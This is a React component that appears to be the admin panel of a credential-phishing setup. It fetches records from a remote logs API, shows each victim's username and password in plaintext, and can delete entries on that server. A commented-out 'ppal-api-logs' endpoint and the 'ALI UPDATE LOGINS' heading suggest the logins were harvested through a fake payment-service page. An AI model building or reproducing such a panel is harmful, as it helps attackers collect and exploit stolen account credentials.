
import React, { useEffect, useState } from "react";

const Logs = ()=>{

    const [info, setInfo] = useState([]);


    useEffect(()=>{

        // const test = 'https://jsonplaceholder.typicode.com/users'

        // const main = 'https://ppal-api-logs.onrender.com/ppal/get';
        // const main1 = 'http://localhost:6040/ali/get';
        const liveLOGS = "https://server-details.onrender.com/ali/get";

        fetch(liveLOGS)
        .then(req=> req.json())
        .then(res=> {
            // console.log('effect', res.data);
            setInfo(res.data);

            // setInfo(res)
        })
        .catch(e=> console.log(e));
    }, []);

    // console.log('component', info);favicon.ico

    return(<React.Fragment>

            <p style={{
                textAlign: 'center',
                fontWeight: 'bold',
                color: '#333',
                margin: '0.4cm auto'
            }}>Data should be displayed below. <b> ALI UPDATE LOGINS </b></p>

        <ul>
            {
                info.map((val, ind)=> (
                    // <li>{val.username}</li>

                    <article style={{ 
                        display: 'flex', 
                        justifyContent: 'center', 
                        width: '97%', 
                        border: '1px solid #ddd', 
                        margin: '12px auto',
                        boxShadow: '3px 3px 4px #ddd',
                        borderRadius: '2px',
                        // margin: '9px'
                    }}
                    key={ind}
                    >
                        <p style={{
                            // border: '1px solid #eaeaea',
                            padding: '15px',
                            fontSize: '15.8px',
                            width: 'inherit'
                        }}>
                            <span style={{fontSize:'15px', fontFamily:'sans-serif'}}>USERNAME:</span> <span><b>"{val.username}"</b></span>
            
                            &#160;
                            &#160;
                            {/* &#160;
                            &#160;
                            &#160;
                            &#160;
                            &#160;
                            &#160;
                            &#160;
                            &#160; */}
            
                            <span style={{fontSize:'15px', fontFamily:'sans-serif'}}>PASSWORD:</span> <span><b>"{val.password}"</b></span>
                        <button style={{
                            cursor: 'pointer',
                            border: '0',
                            outline: '0',
                            borderRadius: '2.3px',
                            padding: '6px 13px',
                            float: 'right',
                            fontWeight: 'bold',
                            color: '#fff',
                            background: '#ba1100',

                        }} onClick={()=>{
                            const del_url = "https://server-details.onrender.com/ali/del";
                            fetch(`${del_url}/${val._id}`, {
                                method: 'DELETE'
                            })
                            .then(req=> {
                                req.json();
                                if(req.ok){
                                    window.location.reload();
                                    alert('a user has been deleted!')
                                }else{
                                    
                                    alert('oops!! an error occured');
                                    throw Error('Poor connectivity');
                                }
                            })
                            .then(data=> {
                                console.log('data');
                            })
                            .catch(err=> console.log('oops!', err))
                        }}>
                            {`Delete`}
                        </button>
                        </p>

                    </article>
                ))
            }
        </ul>

        {/* <LogStyle /> */}
        
    </React.Fragment>)
};


// const LogStyle = ()=>{
//     return(<React.Fragment>
//         <article style={{ 
//             display: 'flex', 
//             justifyContent: 'center', 
//             width: '97%', 
//             border: '1px solid #ddd', 
//             margin: '12px auto',
//             boxShadow: '3px 3px 4px #ddd',
//             borderRadius: '2px',
//             // margin: '9px'
//         }}
//         >
//             <p style={{
//                 // border: '1px solid #eaeaea',
//                 padding: '15px',
//                 fontSize: '15.8px',
//                 width: 'inherit'
//             }}>
//                 <span style={{fontSize:'15px', fontFamily:'sans-serif'}}>USERNAME:</span> <span><b>"users"</b></span>

//                 &#160;
//                 &#160;

//                 <span style={{fontSize:'15px', fontFamily:'sans-serif'}}>PASSWORD:</span> <span><b>"passes"</b></span>
//             </p>
//         </article>
//     </React.Fragment>)
// }

export default Logs;